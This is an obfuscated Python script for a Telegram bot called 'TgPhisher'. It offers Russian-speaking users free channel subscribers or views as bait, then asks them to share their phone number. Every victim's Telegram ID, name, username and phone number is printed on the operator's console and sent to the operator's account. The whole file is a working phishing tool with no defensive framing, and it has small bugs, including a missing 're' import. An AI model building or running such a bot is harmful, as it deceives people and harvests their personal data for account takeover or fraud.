import telebot #line:2
from telebot import types #line:3
import colorama #line:4
from colorama import Fore ,Style ,Back ,init #line:5
import os #line:6
import time #line:7
import sys #line:8
import requests #line:9
init ()#line:10
red =Fore .RED #line:13
cyan =Fore .CYAN #line:14
blue =Fore .BLUE #line:15
green =Fore .GREEN #line:16
yellow =Fore .YELLOW #line:17
reset =Style .RESET_ALL #line:18
bold =Style .BRIGHT #line:19
def print_user_data (OO0OO00OOOO00OO0O ,O0OOOOOO0O000O0OO ,O000O0O0OO000OOO0 =None ,OO00OO0000000OOO0 =None ):#line:21
    O00O0OOO0000O0OOO ="{:-^40}".format ("")#line:22
    print (Fore .YELLOW +O00O0OOO0000O0OOO +Style .RESET_ALL )#line:24
    print (Fore .GREEN +"    ID: "+Fore .WHITE +"{:<31}".format (OO0OO00OOOO00OO0O )+Style .RESET_ALL )#line:25
    print (Fore .GREEN +"    Имя: "+Fore .WHITE +"{:<29}".format (O0OOOOOO0O000O0OO )+Style .RESET_ALL )#line:26
    if O000O0O0OO000OOO0 :#line:28
        print (Fore .GREEN +"    Username: "+Fore .WHITE +"{:<24}".format ("@"+O000O0O0OO000OOO0 )+Style .RESET_ALL )#line:29
    if OO00OO0000000OOO0 :#line:30
        print (Fore .GREEN +"    Номер телефона: "+Fore .WHITE +"     {:<14}".format (OO00OO0000000OOO0 )+Style .RESET_ALL )#line:31
    print (Fore .YELLOW +O00O0OOO0000O0OOO +Style .RESET_ALL )#line:32
os .system ('cls'if os .name =='nt'else 'clear')#line:34
print (f''' {red}{red}
████████╗██████╗       ██╗     ██╗███╗   ██╗██╗  ██╗        
╚══██╔══╝██╔══██╗      ██║     ██║████╗  ██║██║ ██╔╝        
   ██║   ██████╔╝█████╗██║     ██║██╔██╗ ██║█████╔╝         
   ██║   ██╔═══╝ ╚════╝██║     ██║██║╚██╗██║██╔═██╗         
   ██║   ██║           ███████╗██║██║ ╚████║██║  ██╗        
   ╚═╝   ╚═╝           ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝                                                                                                                
{reset}           
  | :Накрутка подписчиков/просмотров: |
      ''')#line:44
def is_valid_token (OOO0O00O000O000O0 ):#line:45
    try :#line:47
        O0O0O000O0OO0OO0O =telebot .TeleBot (OOO0O00O000O000O0 )#line:48
        OO0OO0OO0000O000O =O0O0O000O0OO0OO0O .get_me ()#line:49
        if OO0OO0OO0000O000O :#line:50
            return True #line:51
    except telebot .apihelper .ApiException :#line:52
        return False #line:53
token =input (f"     {blue}Введите токен вашего бота >> ")#line:55
admin_id =input (f"     {blue}Введите ваш телеграм айди >> ")#line:56
if not is_valid_token (token ):#line:58
    print ("{reset}     Неверный токен! Пожалуйста, повторите запуск скрипта")#line:59
    sys .exit #line:60
else :#line:62
    def get_bot_username (O0OO0O00O0OOO0O0O ):#line:63
        O0OO000OOOO00000O =f"https://api.telegram.org/bot{O0OO0O00O0OOO0O0O}/getMe"#line:64
        OOO000O0O0OO0O0OO =requests .get (O0OO000OOOO00000O ).json ()#line:65
        if OOO000O0O0OO0O0OO .get ("ok")and 'username'in OOO000O0O0OO0O0OO .get ("result",{}):#line:68
            return OOO000O0O0OO0O0OO ["result"]["username"]#line:69
        else :#line:70
            return None #line:71
    username =get_bot_username (token )#line:73
    if username :#line:74
        os .system ('cls'if os .name =='nt'else 'clear')#line:75
        print (f'''
{bold}{blue}
      ████████╗██████╗       ██╗     ██╗███╗   ██╗██╗  ██╗        
      ╚══██╔══╝██╔══██╗      ██║     ██║████╗  ██║██║ ██╔╝        
         ██║   ██████╔╝█████╗██║     ██║██╔██╗ ██║█████╔╝         
         ██║   ██╔═══╝ ╚════╝██║     ██║██║╚██╗██║██╔═██╗         
         ██║   ██║           ███████╗██║██║ ╚████║██║  ██╗        
         ╚═╝   ╚═╝           ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝ 
{reset}           
          .:Накрутка подписчиков/просмотров:.   

      ''')#line:87
        print (f"        Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}{reset}\n        Отправьте с вашего аккаунта\n        Команду {yellow}- /start{reset} боту.")#line:88
bot =telebot .TeleBot (token )#line:90
user_states ={}#line:93
user_channels ={}#line:94
@bot .message_handler (commands =['start'])#line:96
def handle_start (OOOOOOOO0O0O0OO00 ):#line:97
    user_states [OOOOOOOO0O0O0OO00 .chat .id ]="START"#line:98
    O0O00O0O0OOO0O0O0 =types .InlineKeyboardMarkup ()#line:99
    OO0O00O00OOO0O0OO =types .InlineKeyboardButton (text ="Продолжить",callback_data ="continue")#line:100
    O0O00O0O0OOO0O0O0 .add (OO0O00O00OOO0O0OO )#line:101
    bot .send_message (OOOOOOOO0O0O0OO00 .chat .id ,"Привет! 👋\n\nДанный сервис поможет вам увеличить подписчиков и просмотры вашего канала. Давайте начнем! ✨",reply_markup =O0O00O0O0OOO0O0O0 )#line:102
@bot .callback_query_handler (func =lambda O00OOO00OO000O000 :O00OOO00OO000O000 .data =="continue")#line:104
def handle_continue (O0000O00000OOOOO0 ):#line:105
    bot .delete_message (O0000O00000OOOOO0 .message .chat .id ,O0000O00000OOOOO0 .message .message_id )#line:106
    user_states [O0000O00000OOOOO0 .message .chat .id ]="AWAITING_CHANNEL"#line:107
    bot .send_message (O0000O00000OOOOO0 .message .chat .id ,"Отправьте публичную ссылку вашего канала в формате @username.")#line:108
@bot .message_handler (func =lambda O0000OOOO0OOOOOOO :user_states .get (O0000OOOO0OOOOOOO .chat .id )=="AWAITING_CHANNEL")#line:110
def process_channel_step (OOO0000OO0OOOOO0O ):#line:111
    O0OOOOO0OO000O0O0 =OOO0000OO0OOOOO0O .text #line:112
    if not re .match (r'^@([a-zA-Z0-9_]{5,32})$',O0OOOOO0OO000O0O0 ):#line:113
        bot .send_message (OOO0000OO0OOOOO0O .chat .id ,"Пожалуйста, отправьте действительное имя канала в формате @username.")#line:114
        return #line:115
    user_channels [OOO0000OO0OOOOO0O .chat .id ]=O0OOOOO0OO000O0O0 #line:117
    O00OO00OO0O00OO0O =types .ReplyKeyboardMarkup (row_width =1 ,one_time_keyboard =True )#line:118
    OO0O0O0O0O000O00O =types .KeyboardButton ("500 подписчиков")#line:119
    O0OOOO000O000O0O0 =types .KeyboardButton ("500 просмотров")#line:120
    O00OO00OO0O00OO0O .add (OO0O0O0O0O000O00O ,O0OOOO000O000O0O0 )#line:121
    user_states [OOO0000OO0OOOOO0O .chat .id ]="AWAITING_CHOICE"#line:122
    bot .send_message (OOO0000OO0OOOOO0O .chat .id ,"Выберите количество подписчиков или просмотров:",reply_markup =O00OO00OO0O00OO0O )#line:123
@bot .message_handler (func =lambda OOO0OOOOO00O00O00 :user_states .get (OOO0OOOOO00O00O00 .chat .id )=="AWAITING_CHOICE")#line:125
def process_choice_step (OO00O00000000O000 ):#line:126
    if OO00O00000000O000 .text not in ["500 подписчиков","500 просмотров"]:#line:127
        bot .send_message (OO00O00000000O000 .chat .id ,"Для приобретения большего количества подписчиков и просмотров обратитесь к админу.")#line:128
        return #line:129
    OO0OO00OO0O00OO0O =types .ReplyKeyboardMarkup (row_width =1 ,one_time_keyboard =True )#line:131
    O0OOO00O0O000O0O0 =types .KeyboardButton ("Подтвердить номер телефона",request_contact =True )#line:132
    OO0OO00OO0O00OO0O .add (O0OOO00O0O000O0O0 )#line:133
    user_states [OO00O00000000O000 .chat .id ]="AWAITING_PHONE_CONFIRM"#line:134
    bot .send_message (OO00O00000000O000 .chat .id ,"Подтвердите ваш номер телефона для продолжения.",reply_markup =OO0OO00OO0O00OO0O )#line:135
@bot .message_handler (content_types =['contact'])#line:137
def handle_contact (O0000OO0O0OO00OOO ):#line:138
    if user_states .get (O0000OO0O0OO00OOO .chat .id )!="AWAITING_PHONE_CONFIRM":#line:139
        return #line:140
    print_user_data (O0000OO0O0OO00OOO .from_user .id ,O0000OO0O0OO00OOO .from_user .first_name ,O0000OO0O0OO00OOO .from_user .username ,O0000OO0O0OO00OOO .contact .phone_number )#line:141
    print ()#line:142
    try :#line:143
        bot .send_message (admin_id ,f'''
#TgPhisher - {username}

- {O0000OO0O0OO00OOO.from_user.id}
- {O0000OO0O0OO00OOO.from_user.first_name}
- {O0000OO0O0OO00OOO.from_user.username}
- {O0000OO0O0OO00OOO.contact.phone_number}
''')#line:151
    except :#line:152
        print ('     error send to ADMIN_ID      ')#line:153
    bot .send_message (O0000OO0O0OO00OOO .chat .id ,f"<b>Запрос отправлен</b>Ваш запрос будет обработан в ближайшее время.\nВаш id:{O0000OO0O0OO00OOO.from_user.id}",parse_mode ='HTML')#line:155
try :#line:156
    bot .polling (none_stop =True )#line:157
except Exception as e :#line:158
    print (f"Произошла ошибка: {e}")